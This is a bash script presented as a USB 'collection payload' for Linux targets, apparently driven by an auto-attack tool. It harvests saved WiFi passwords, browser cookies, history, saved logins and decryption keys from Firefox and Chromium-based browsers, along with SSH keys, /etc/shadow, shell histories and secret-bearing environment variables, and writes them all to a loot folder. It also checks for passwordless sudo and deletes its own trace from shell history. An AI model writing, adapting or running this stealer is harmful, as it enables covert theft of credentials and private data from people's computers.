#!/bin/bash
# CyberPI Linux Collection Payload v3 — Multi-Target Edition
# Deep data extraction — WiFi passwords, browser data, system info
# Supports per-target profile directories

# Profile name passed as argument (from auto_attack_v2.py)
PROFILE_NAME="${1:-}"

# Find our own directory (the USB mount point)
SELF_DIR="$(cd "$(dirname "$0")" && pwd)"

# If profile name given, output to targets/PROFILE_NAME/
if [ -n "$PROFILE_NAME" ]; then
    BASE="$SELF_DIR/targets/$PROFILE_NAME"
else
    BASE="$SELF_DIR"
fi

OUT="$BASE/collection_summary.txt"
LOOT="$BASE/loot"
mkdir -p "$BASE" "$LOOT/wifi" "$LOOT/browser" "$LOOT/ssh" "$LOOT/system" 2>/dev/null

{
echo "=== LINUX COLLECTION v2 ==="
echo "Date: $(date)"
echo "User: $(whoami)"
echo "Hostname: $(hostname)"
echo "Home: $HOME"

echo "=== OS ==="
cat /etc/os-release 2>/dev/null | head -6

echo "=== KERNEL ==="
uname -a

echo "=== IP ADDRESSES ==="
ip -br addr 2>/dev/null | head -15

echo "=== ROUTING ==="
ip route 2>/dev/null | head -5

echo "=== DNS ==="
cat /etc/resolv.conf 2>/dev/null | grep -v '^#'

# ─── WIFI PASSWORDS ────────────────────────────────────────
echo ""
echo "========================================="
echo "=== WIFI PASSWORDS ==="
echo "========================================="

# Method 1: nmcli show-secrets (works for current user's saved connections)
echo "--- nmcli saved passwords ---"
for ssid in $(nmcli -t -f NAME,TYPE con show 2>/dev/null | grep '802-11-wireless$' | cut -d: -f1); do
    psk=$(nmcli -s -g 802-11-wireless-security.psk connection show "$ssid" 2>/dev/null)
    if [ -n "$psk" ]; then
        echo "SSID: $ssid  PSK: $psk"
    else
        echo "SSID: $ssid  PSK: (access denied or open)"
    fi
done

# Method 2: Read NM connection files directly (needs read permission)
echo "--- NetworkManager config files ---"
for f in /etc/NetworkManager/system-connections/*.nmconnection \
         /etc/NetworkManager/system-connections/*.conf; do
    [ -f "$f" ] 2>/dev/null || continue
    name=$(basename "$f")
    echo "  File: $name"
    psk=$(grep -i 'psk=' "$f" 2>/dev/null)
    ssid_line=$(grep -i 'ssid=' "$f" 2>/dev/null)
    [ -n "$ssid_line" ] && echo "    $ssid_line"
    [ -n "$psk" ] && echo "    $psk"
    # Also copy the files
    cp "$f" "$LOOT/wifi/" 2>/dev/null
done

# Method 3: wpa_supplicant config (older systems)
echo "--- wpa_supplicant ---"
for f in /etc/wpa_supplicant/wpa_supplicant.conf \
         /etc/wpa_supplicant/*.conf; do
    [ -f "$f" ] 2>/dev/null || continue
    cat "$f" 2>/dev/null && cp "$f" "$LOOT/wifi/" 2>/dev/null
done

# Method 4: If we have sudo, dump all wifi passwords
if sudo -n true 2>/dev/null; then
    echo "--- SUDO: Full wifi dump ---"
    for f in /etc/NetworkManager/system-connections/*; do
        [ -f "$f" ] && sudo cat "$f" 2>/dev/null >> "$LOOT/wifi/all_connections.txt"
        echo "---" >> "$LOOT/wifi/all_connections.txt"
    done
fi

# ─── BROWSER HISTORY & COOKIES ─────────────────────────────
echo ""
echo "========================================="
echo "=== BROWSER DATA ==="
echo "========================================="

# Firefox
echo "--- Firefox ---"
for profile_dir in ~/.mozilla/firefox/*.default* ~/.mozilla/firefox/*.esr*; do
    [ -d "$profile_dir" ] || continue
    pname=$(basename "$profile_dir")
    echo "  Profile: $pname"
    mkdir -p "$LOOT/browser/firefox_$pname" 2>/dev/null

    # History (places.sqlite)
    if [ -f "$profile_dir/places.sqlite" ]; then
        cp "$profile_dir/places.sqlite" "$LOOT/browser/firefox_$pname/" 2>/dev/null
        echo "  [+] places.sqlite (history+bookmarks) copied"
        # Extract recent URLs as text
        if command -v sqlite3 >/dev/null 2>&1; then
            echo "  --- Recent Firefox History (last 100 URLs) ---"
            sqlite3 "$profile_dir/places.sqlite" \
                "SELECT datetime(last_visit_date/1000000,'unixepoch','localtime'), url, title FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 100;" 2>/dev/null \
                | tee "$LOOT/browser/firefox_$pname/history.txt"
        fi
    fi

    # Cookies
    if [ -f "$profile_dir/cookies.sqlite" ]; then
        cp "$profile_dir/cookies.sqlite" "$LOOT/browser/firefox_$pname/" 2>/dev/null
        echo "  [+] cookies.sqlite copied"
        if command -v sqlite3 >/dev/null 2>&1; then
            echo "  --- Firefox Cookies (unique domains, last 50) ---"
            sqlite3 "$profile_dir/cookies.sqlite" \
                "SELECT DISTINCT host, name, datetime(expiry,'unixepoch','localtime') FROM moz_cookies ORDER BY lastAccessed DESC LIMIT 50;" 2>/dev/null \
                | tee "$LOOT/browser/firefox_$pname/cookies.txt"
        fi
    fi

    # Saved logins
    for lf in logins.json key4.db key3.db cert9.db; do
        [ -f "$profile_dir/$lf" ] && cp "$profile_dir/$lf" "$LOOT/browser/firefox_$pname/" 2>/dev/null && echo "  [+] $lf copied"
    done

    # Form history
    [ -f "$profile_dir/formhistory.sqlite" ] && cp "$profile_dir/formhistory.sqlite" "$LOOT/browser/firefox_$pname/" 2>/dev/null && echo "  [+] formhistory.sqlite copied"
done

# Chrome / Chromium / Brave
for browser_label in "Chrome:$HOME/.config/google-chrome" \
                     "Chromium:$HOME/.config/chromium" \
                     "Brave:$HOME/.config/BraveSoftware/Brave-Browser"; do
    bname="${browser_label%%:*}"
    bpath="${browser_label#*:}"
    [ -d "$bpath/Default" ] || continue

    echo "--- $bname ---"
    mkdir -p "$LOOT/browser/${bname,,}_Default" 2>/dev/null

    # History
    if [ -f "$bpath/Default/History" ]; then
        cp "$bpath/Default/History" "$LOOT/browser/${bname,,}_Default/" 2>/dev/null
        echo "  [+] History DB copied"
        if command -v sqlite3 >/dev/null 2>&1; then
            echo "  --- Recent $bname History (last 100 URLs) ---"
            sqlite3 "$bpath/Default/History" \
                "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'), url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100;" 2>/dev/null \
                | tee "$LOOT/browser/${bname,,}_Default/history.txt"
        fi
    fi

    # Cookies
    if [ -f "$bpath/Default/Cookies" ]; then
        cp "$bpath/Default/Cookies" "$LOOT/browser/${bname,,}_Default/" 2>/dev/null
        echo "  [+] Cookies DB copied"
        if command -v sqlite3 >/dev/null 2>&1; then
            echo "  --- $bname Cookies (unique domains, last 50) ---"
            sqlite3 "$bpath/Default/Cookies" \
                "SELECT DISTINCT host_key, name, datetime(expires_utc/1000000-11644473600,'unixepoch','localtime') FROM cookies ORDER BY last_access_utc DESC LIMIT 50;" 2>/dev/null \
                | tee "$LOOT/browser/${bname,,}_Default/cookies.txt"
        fi
    fi

    # Login Data (encrypted passwords)
    if [ -f "$bpath/Default/Login Data" ]; then
        cp "$bpath/Default/Login Data" "$LOOT/browser/${bname,,}_Default/" 2>/dev/null
        echo "  [+] Login Data copied"
        if command -v sqlite3 >/dev/null 2>&1; then
            echo "  --- $bname Saved Login URLs ---"
            sqlite3 "$bpath/Default/Login Data" \
                "SELECT origin_url, username_value, datetime(date_created/1000000-11644473600,'unixepoch','localtime') FROM logins;" 2>/dev/null \
                | tee "$LOOT/browser/${bname,,}_Default/logins.txt"
        fi
    fi

    # Bookmarks
    [ -f "$bpath/Default/Bookmarks" ] && cp "$bpath/Default/Bookmarks" "$LOOT/browser/${bname,,}_Default/" 2>/dev/null && echo "  [+] Bookmarks copied"

    # Local State (master key for cookie/password decryption)
    [ -f "$bpath/Local State" ] && cp "$bpath/Local State" "$LOOT/browser/${bname,,}_Default/" 2>/dev/null && echo "  [+] Local State copied"
done

# ─── SSH KEYS ──────────────────────────────────────────────
echo ""
echo "========================================="
echo "=== SSH DATA ==="
echo "========================================="
if [ -d ~/.ssh ]; then
    cp -r ~/.ssh/* "$LOOT/ssh/" 2>/dev/null
    echo "SSH directory contents:"
    ls -la ~/.ssh/
    # Show public keys
    for pub in ~/.ssh/*.pub; do
        [ -f "$pub" ] && echo "  $(basename $pub): $(cat $pub)"
    done
    # Show SSH config
    [ -f ~/.ssh/config ] && echo "--- SSH Config ---" && cat ~/.ssh/config
fi

# ─── SYSTEM DATA ──────────────────────────────────────────
echo ""
echo "========================================="
echo "=== SYSTEM DATA ==="
echo "========================================="

echo "=== SUDO CHECK ==="
sudo -n true 2>/dev/null && echo "PASSWORDLESS SUDO - JACKPOT!" || echo "no passwordless sudo"

echo "=== USERS ==="
cat /etc/passwd 2>/dev/null | grep -E '/bin/(ba)?sh' | cut -d: -f1,3,6

echo "=== SHADOW (if readable) ==="
cat /etc/shadow 2>/dev/null | head -10 && cp /etc/shadow "$LOOT/system/" 2>/dev/null || echo "(not readable)"

echo "=== SUID BINARIES ==="
find / -perm -4000 -type f 2>/dev/null | head -25

echo "=== LISTENING PORTS ==="
ss -tlnp 2>/dev/null | head -20

echo "=== CRONTAB ==="
crontab -l 2>/dev/null || echo "none"

echo "=== RECENT HISTORY (full) ==="
cat ~/.bash_history 2>/dev/null | tail -200
cat ~/.zsh_history 2>/dev/null | tail -200
# Copy full history files
cp ~/.bash_history "$LOOT/system/bash_history" 2>/dev/null
cp ~/.zsh_history "$LOOT/system/zsh_history" 2>/dev/null

echo "=== ENVIRONMENT VARIABLES ==="
env 2>/dev/null | grep -iE 'key|token|pass|secret|api|auth|pwd' | head -20

echo "=== GIT CONFIG ==="
cat ~/.gitconfig 2>/dev/null
git config --global --list 2>/dev/null

echo "=== GPG KEYS ==="
gpg --list-keys 2>/dev/null | head -20

echo "=== DOCKER ==="
docker ps -a 2>/dev/null | head -10 || echo "no docker"

echo "=== INSTALLED PACKAGES ==="
dpkg --get-selections 2>/dev/null | wc -l || \
  rpm -qa 2>/dev/null | wc -l || \
  echo "unknown"

echo ""
echo "=== LOOT SUMMARY ==="
echo "Files collected:"
find "$LOOT" -type f 2>/dev/null | while read f; do
    echo "  $(du -h "$f" 2>/dev/null | cut -f1)  $(echo "$f" | sed "s|$BASE/||")"
done
echo ""
echo "Profile: ${PROFILE_NAME:-root}"
echo "=== COLLECTION COMPLETE ==="
} > "$OUT" 2>&1

# Flush all data to USB before writing completion marker
sync 2>/dev/null

# Signal marker for Pi to detect completion (in profile dir AND root)
echo "done" > "$BASE/.canary_unlock"
[ -n "$PROFILE_NAME" ] && echo "done" > "$SELF_DIR/.canary_unlock" 2>/dev/null

# Final sync to ensure marker is on disk
sync 2>/dev/null

# Self-cleanup: remove from terminal history
history -d $(history 1 | awk '{print $1}') 2>/dev/null
exit
